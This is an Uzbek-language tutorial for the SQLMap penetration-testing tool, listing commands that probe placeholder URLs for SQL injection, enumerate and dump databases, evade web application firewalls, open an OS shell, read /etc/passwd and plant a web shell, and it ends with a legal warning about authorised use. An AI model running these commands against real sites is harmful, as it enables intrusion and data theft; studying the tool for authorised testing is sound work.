SQLMap - To'liq qo'llanma
SQLMap - bu SQL in'ektsiya zaifliklarini avtomatik aniqlash va ekspluatatsiya qilish uchun ochiq kodli penetratsiya test qilish vositasi.
O'rnatish
bash# Git orqali
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py

# Yoki apt orqali (Linux)
sudo apt-get install sqlmap
Asosiy ishlatish
1. Oddiy URL tekshirish
bashsqlmap -u "http://example.com/page.php?id=1"
2. POST so'rovi bilan
bashsqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"
3. Cookie bilan
bashsqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"
4. HTTP headerlar bilan
bashsqlmap -u "http://example.com/page.php?id=1" --headers="User-Agent: Custom\nX-Forwarded-For: 127.0.0.1"
Ma'lumotlar bazasini tekshirish
Mavjud ma'lumotlar bazalarini ko'rish
bashsqlmap -u "http://example.com/page.php?id=1" --dbs
Joriy ma'lumotlar bazasini aniqlash
bashsqlmap -u "http://example.com/page.php?id=1" --current-db
Ma'lum bir bazaning jadvallarini ko'rish
bashsqlmap -u "http://example.com/page.php?id=1" -D database_name --tables
Jadval ustunlarini ko'rish
bashsqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns
Ma'lumotlarni olish
bashsqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump
Muhim parametrlar
Xavfsizlik darajalari
bash# Level (1-5): tekshirish chuqurligi
--level=3

# Risk (1-3): xavfli so'rovlar darajasi
--risk=2
Texnika tanlash
bash# Muayyan texnikani ishlatish
--technique=BEUSTQ
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries
Vaqt sozlamalari
bash# Timeout
--timeout=10

# Qayta urinishlar soni
--retries=3

# Kechikish (soniyalarda)
--delay=2
Bypass texnikalari
bash# Tamperscriptlar ishlatish
--tamper=space2comment,between

# Random User-Agent
--random-agent

# WAF/IPS ni aniqlash
--identify-waf

# WAF ni bypass qilish
--tamper=space2comment --random-agent
Kengaytirilgan funksiyalar
OS buyruqlarini bajarish
bashsqlmap -u "http://example.com/page.php?id=1" --os-shell
Fayl o'qish
bashsqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"
Fayl yuklash
bashsqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
SQL shell
bashsqlmap -u "http://example.com/page.php?id=1" --sql-shell
Request fayldan o'qish
bash# Burp Suite dan saqlangan request
sqlmap -r request.txt

# request.txt tarkibi:
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=pass
Ma'lumotlarni eksport qilish
bash# CSV formatda
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T users --dump --dump-format=CSV

# Ma'lum joyga saqlash
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T users --dump --output-dir=/tmp/sqlmap
Foydali kombinatsiyalar
To'liq avtomatik rejim
bashsqlmap -u "http://example.com/page.php?id=1" --batch --dbs
Tez test (minimal level)
bashsqlmap -u "http://example.com/page.php?id=1" --batch --smart
Maksimal test (kuchli)
bashsqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --batch
Proxy orqali
bashsqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
Muhim eslatmalar
⚠️ Qonuniy ogohlantirish: SQLMap faqat ruxsat etilgan tizimlarda test qilish uchun ishlatilishi kerak. Noqonuniy ishlatish jinoiy javobgarlikka olib keladi.
🔒 Xavfsizlik:

Faqat o'z tizimlaringizda yoki ruxsat bilan test qiling
Production muhitda ehtiyot bo'ling
Har doim zaxira nusxa oling

💡 Maslahatlar:

--batch parametri barcha savollarga "ha" deb javob beradi
--threads parametri bilan tezlikni oshirish mumkin
--technique bilan muayyan texnikalarni tanlang
Tamper scriptlar WAF/IPS ni bypass qilishda yordam beradi